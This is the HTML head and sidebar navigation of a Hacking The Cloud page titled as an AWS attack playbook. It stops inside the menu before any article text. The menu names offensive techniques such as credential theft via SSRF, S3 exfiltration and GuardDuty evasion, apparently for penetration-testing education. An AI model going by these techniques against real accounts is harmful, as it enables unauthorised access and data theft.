<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A playbook on how to exploit AWS resources that can be misconfigured via resource-based policies."><link href=https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/ rel=canonical><link href=../exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/ rel=prev><link href=../misconfigured_ecr_resource_policy/ rel=next><link rel=alternate type=application/rss+xml title="RSS feed" href=../../../../feed_rss_created.xml><link rel=alternate type=application/rss+xml title="RSS feed of updated content" href=../../../../feed_rss_updated.xml><link rel=icon href=../../../../assets/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.5.49+insiders-4.53.14"><title>Exploiting Public AWS Resources Programmatically - The Playbook - Hacking The Cloud</title><link rel=stylesheet href=../../../../assets/stylesheets/main.d0dfab1c.min.css><link rel=stylesheet href=../../../../assets/stylesheets/palette.ab4e12ef.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../../stylesheets/extra.css><script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><meta property=og:type content=website><meta property=og:title content="Exploiting Public AWS Resources Programmatically - The Playbook - Hacking The Cloud"><meta property=og:description content="A playbook on how to exploit AWS resources that can be misconfigured via resource-based policies."><meta property=og:image content=https://hackingthe.cloud/assets/images/social/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook.png><meta property=og:image:type content=image/png><meta property=og:image:width content=1200><meta property=og:image:height content=630><meta content=https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/ property=og:url><meta property=twitter:card content=summary_large_image><meta property=twitter:title content="Exploiting Public AWS Resources Programmatically - The Playbook - Hacking The Cloud"><meta property=twitter:description content="A playbook on how to exploit AWS resources that can be misconfigured via resource-based policies."><meta property=twitter:image content=https://hackingthe.cloud/assets/images/social/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook.png> <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=indigo> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#exploiting-public-aws-resources-cli-attack-playbook class=md-skip> Skip to content </a> </div> <div data-md-component=announce> <aside class=md-banner> <div class="md-banner__inner md-grid md-typeset"> For updates follow <strong>Nick Frichette</strong> on <a rel=me href=https://bsky.app/profile/frichetten.com> <span class="twemoji bluesky"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M111.8 62.2C170.2 105.9 233 194.7 256 242.4c23-47.6 85.8-136.4 144.2-180.2 42.1-31.6 110.3-56 110.3 21.8 0 15.5-8.9 130.5-14.1 149.2-18.2 64.8-84.4 81.4-143.3 71.3C456 322 482.2 380 425.6 438c-107.4 110.2-154.3-27.6-166.3-62.9-1.7-4.9-2.6-7.8-3.3-7.8s-1.6 3-3.3 7.8c-12 35.3-59 173.1-166.3 62.9-56.5-58-30.4-116 72.5-133.5C100 314.6 33.8 298 15.7 233.1 10.4 214.4 1.5 99.4 1.5 83.9c0-77.8 68.2-53.4 110.3-21.8z"/></svg> </span> <strong>Bluesky</strong> </a>. </div> </aside> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../../.. title="Hacking The Cloud" class="md-header__button md-logo" aria-label="Hacking The Cloud" data-md-component=logo> <img src=../../../../assets/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Hacking The Cloud </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Exploiting Public AWS Resources Programmatically - The Playbook </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=indigo aria-label="Switch to Dark Mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to Dark Mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=red data-md-color-accent=indigo aria-label="Switch to Light Mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to Light Mode" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=Search> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/Hacking-the-Cloud/hackingthe.cloud title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </div> <div class=md-source__repository> Hacking The Cloud </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../.. class=md-tabs__link> Hacking The Cloud </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../../../general-knowledge/aws_cli_tips_and_tricks/ class=md-tabs__link> AWS </a> </li> <li class=md-tabs__item> <a href=../../../../azure/abusing-managed-identities/ class=md-tabs__link> Azure </a> </li> <li class=md-tabs__item> <a href=../../../../gcp/general-knowledge/default-account-names/ class=md-tabs__link> GCP </a> </li> <li class=md-tabs__item> <a href=../../../../terraform/terraform_ansi_escape_evasion/ class=md-tabs__link> Terraform </a> </li> <li class=md-tabs__item> <a href=../../../../blog/2023_wrap-up/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../.. title="Hacking The Cloud" class="md-nav__button md-logo" aria-label="Hacking The Cloud" data-md-component=logo> <img src=../../../../assets/logo.png alt=logo> </a> Hacking The Cloud </label> <div class=md-nav__source> <a href=https://github.com/Hacking-the-Cloud/hackingthe.cloud title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </div> <div class=md-source__repository> Hacking The Cloud </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../.. class=md-nav__link> <span class=md-ellipsis> Hacking The Cloud </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2 id=__nav_2_label tabindex> <span class=md-ellipsis> AWS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_2_label aria-expanded=true> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> AWS </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1 id=__nav_2_1_label tabindex=0> <span class=md-ellipsis> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_1_label aria-expanded=false> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../general-knowledge/aws_cli_tips_and_tricks/ class=md-nav__link> <span class=md-ellipsis> AWS CLI Tips and Tricks </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/aws_organizations_defaults/ class=md-nav__link> <span class=md-ellipsis> AWS Organizations Defaults & Pivoting </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/block-expensive-actions-with-scps/ class=md-nav__link> <span class=md-ellipsis> Prevent Expensive AWS API Actions with SCPs </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/connection-tracking/ class=md-nav__link> <span class=md-ellipsis> Connection Tracking </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/iam-key-identifiers/ class=md-nav__link> <span class=md-ellipsis> IAM unique identifiers </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/intro_metadata_service/ class=md-nav__link> <span class=md-ellipsis> Introduction to the Instance Metadata Service </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/introduction_user_data/ class=md-nav__link> <span class=md-ellipsis> Introduction to User Data </span> </a> </li> <li class=md-nav__item> <a href=../../../general-knowledge/using_stolen_iam_credentials/ class=md-nav__link> <span class=md-ellipsis> Using Stolen IAM Credentials </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2 id=__nav_2_2_label tabindex=0> <span class=md-ellipsis> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_2_label aria-expanded=false> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../enumeration/account_id_from_ec2/ class=md-nav__link> <span class=md-ellipsis> Enumerate AWS Account ID from an EC2 Instance </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/account_id_from_s3_bucket/ class=md-nav__link> <span class=md-ellipsis> Enumerate AWS Account ID from a Public S3 Bucket </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/brute_force_iam_permissions/ class=md-nav__link> <span class=md-ellipsis> Brute Force IAM Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/bypass_cognito_user_enumeration_controls/ class=md-nav__link> <span class=md-ellipsis> Bypass Cognito Account Enumeration Controls </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/discover_secrets_in_public_aims/ class=md-nav__link> <span class=md-ellipsis> Discover secrets in public AMIs </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/enum_iam_user_role/ class=md-nav__link> <span class=md-ellipsis> Unauthenticated Enumeration of IAM Users and Roles </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/enumerate_principal_arn_from_unique_id/ class=md-nav__link> <span class=md-ellipsis> Derive a Principal ARN from an AWS Unique Identifier </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/enumerate_root_email_from_console/ class=md-nav__link> <span class=md-ellipsis> Enumerate Root User Email Address from the AWS Console </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/get-account-id-from-keys/ class=md-nav__link> <span class=md-ellipsis> Get Account ID from AWS Access Keys </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/loot_public_ebs_snapshots/ class=md-nav__link> <span class=md-ellipsis> Loot Public EBS Snapshots </span> </a> </li> <li class=md-nav__item> <a href=../../../enumeration/whoami/ class=md-nav__link> <span class=md-ellipsis> Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3 id=__nav_2_3_label tabindex=0> <span class=md-ellipsis> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_3_label aria-expanded=true> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../abusing-container-registry/ class=md-nav__link> <span class=md-ellipsis> Abusing Elastic Container Registry for Lateral Movement </span> </a> </li> <li class=md-nav__item> <a href=../../cognito_identity_pool_excessive_privileges/ class=md-nav__link> <span class=md-ellipsis> Abusing Overpermissioned AWS Cognito Identity Pools </span> </a> </li> <li class=md-nav__item> <a href=../../cognito_user_self_signup/ class=md-nav__link> <span class=md-ellipsis> Abusing Unintended Self-Signup in AWS Cognito </span> </a> </li> <li class=md-nav__item> <a href=../../ec2-metadata-ssrf/ class=md-nav__link> <span class=md-ellipsis> Steal EC2 Metadata Credentials via SSRF </span> </a> </li> <li class=md-nav__item> <a href=../../iam_privilege_escalation/ class=md-nav__link> <span class=md-ellipsis> AWS IAM Privilege Escalation Techniques </span> </a> </li> <li class=md-nav__item> <a href=../../lambda-steal-iam-credentials/ class=md-nav__link> <span class=md-ellipsis> Steal IAM Credentials and Event Data from Lambda </span> </a> </li> <li class=md-nav__item> <a href=../../local_ec2_priv_esc_through_user_data/ class=md-nav__link> <span class=md-ellipsis> EC2 Privilege Escalation Through User Data </span> </a> </li> <li class=md-nav__item> <a href=../../orphaned_cloudfront_or_dns_takeover_via_s3/ class=md-nav__link> <span class=md-ellipsis> DNS and CloudFront Domain Takeover via Deleted S3 Buckets </span> </a> </li> <li class=md-nav__item> <a href=../../route53_modification_privilege_escalation/ class=md-nav__link> <span class=md-ellipsis> AWS API Call Hijacking via ACM-PCA </span> </a> </li> <li class=md-nav__item> <a href=../../s3-bucket-replication-exfiltration/ class=md-nav__link> <span class=md-ellipsis> Exfiltrating S3 Data with Bucket Replication Policies </span> </a> </li> <li class=md-nav__item> <a href=../../s3_server_access_logs/ class=md-nav__link> <span class=md-ellipsis> Data Exfiltration through S3 Server Access Logs </span> </a> </li> <li class=md-nav__item> <a href=../../s3_streaming_copy/ class=md-nav__link> <span class=md-ellipsis> S3 Streaming Copy </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_3_13 checked> <div class="md-nav__link md-nav__container"> <a href=../ class="md-nav__link "> <span class=md-ellipsis> Misconfigured Resource Based Policies </span> </a> <label class="md-nav__link " for=__nav_2_3_13 id=__nav_2_3_13_label tabindex=0> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=3 aria-labelledby=__nav_2_3_13_label aria-expanded=true> <label class=md-nav__title for=__nav_2_3_13> <span class="md-nav__icon md-icon"></span> Misconfigured Resource Based Policies </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../exploit_amplify_vulnerability_in_same_account_scenario/ class=md-nav__link> <span class=md-ellipsis> CVE-2024-28056: Exploit an AWS Amplify Vulnerability in Same-Account Scenarios </span> </a> </li> <li class=md-nav__item> <a href=../exploiting_misconfigured_gitlab_oidc_aws_iam_roles/ class=md-nav__link> <span class=md-ellipsis> Exploiting Misconfigured GitLab OIDC AWS IAM Roles </span> </a> </li> <li class=md-nav__item> <a href=../exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/ class=md-nav__link> <span class=md-ellipsis> Exploiting Misconfigured Terraform Cloud OIDC AWS IAM Roles </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Exploiting Public AWS Resources Programmatically - The Playbook </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Exploiting Public AWS Resources Programmatically - The Playbook </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#1-can-be-found-from-black-box-perspective class=md-nav__link> <span class=md-ellipsis> 1. Can be found from black-box perspective </span> </a> <nav class=md-nav aria-label="1. Can be found from black-box perspective"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#s3-buckets class=md-nav__link> <span class=md-ellipsis> S3 Buckets </span> </a> <nav class=md-nav aria-label="S3 Buckets"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#public-list-read-and-write class=md-nav__link> <span class=md-ellipsis> Public List, Read and Write </span> </a> </li> <li class=md-nav__item> <a href=#authenticated-list-and-write class=md-nav__link> <span class=md-ellipsis> Authenticated List and Write </span> </a> </li> <li class=md-nav__item> <a href=#s3-static-website-list-unauthenticated class=md-nav__link> <span class=md-ellipsis> S3 Static Website List Unauthenticated </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#amis class=md-nav__link> <span class=md-ellipsis> AMIs </span> </a> </li> <li class=md-nav__item> <a href=#ebs-snapshots class=md-nav__link> <span class=md-ellipsis> EBS Snapshots </span> </a> </li> <li class=md-nav__item> <a href=#rds-snapshots class=md-nav__link> <span class=md-ellipsis> RDS Snapshots </span> </a> </li> <li class=md-nav__item> <a href=#iam-roles class=md-nav__link> <span class=md-ellipsis> IAM Roles </span> </a> </li> <li class=md-nav__item> <a href=#ssm-documents class=md-nav__link> <span class=md-ellipsis> SSM Documents </span> </a> </li> <li class=md-nav__item> <a href=#cloudfront class=md-nav__link> <span class=md-ellipsis> CloudFront </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-cant-be-found-from-a-black-box-perspective class=md-nav__link> <span class=md-ellipsis> 2. Can't be found from a black-box perspective </span> </a> <nav class=md-nav aria-label="2. Can't be found from a black-box perspective"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#sns-topics class=md-nav__link> <span class=md-ellipsis> SNS Topics </span> </a> </li> <li class=md-nav__item> <a href=#sqs-queues class=md-nav__link> <span class=md-ellipsis> SQS Queues </span> </a> </li> <li class=md-nav__item> <a href=#private-api-gateways class=md-nav__link> <span class=md-ellipsis> Private API Gateways </span> </a> </li> <li class=md-nav__item> <a href=#lambda-functions class=md-nav__link> <span class=md-ellipsis> Lambda Functions </span> </a> </li> <li class=md-nav__item> <a href=#ecr-repositories class=md-nav__link> <span class=md-ellipsis> ECR Repositories </span> </a> <nav class=md-nav aria-label="ECR Repositories"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#private-repository-access class=md-nav__link> <span class=md-ellipsis> Private Repository Access </span> </a> </li> <li class=md-nav__item> <a href=#public-repository-access class=md-nav__link> <span class=md-ellipsis> Public Repository Access </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#call-for-contributions class=md-nav__link> <span class=md-ellipsis> Call for contributions </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../misconfigured_ecr_resource_policy/ class=md-nav__link> <span class=md-ellipsis> Abusing Misconfigured ECR Resource Policies </span> </a> </li> <li class=md-nav__item> <a href=../misconfigured_iam_role_trust_policy_wildcard_principal/ class=md-nav__link> <span class=md-ellipsis> Abusing Misconfigured Role Trust Policies with a Wildcard Principal </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4 id=__nav_2_4_label tabindex=0> <span class=md-ellipsis> Avoid Detection </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_4_label aria-expanded=false> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Avoid Detection </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../avoiding-detection/guardduty-pentest/ class=md-nav__link> <span class=md-ellipsis> Bypass GuardDuty Pentest Findings for the AWS CLI </span> </a> </li> <li class=md-nav__item> <a href=../../../avoiding-detection/guardduty-tor-client/ class=md-nav__link> <span class=md-ellipsis> Bypass GuardDuty Tor Client Findings </span> </a> </li> <li class=md-nav__item> <a href=../../../avoiding-detection/modify-guardduty-config/ class=md-nav__link> <span 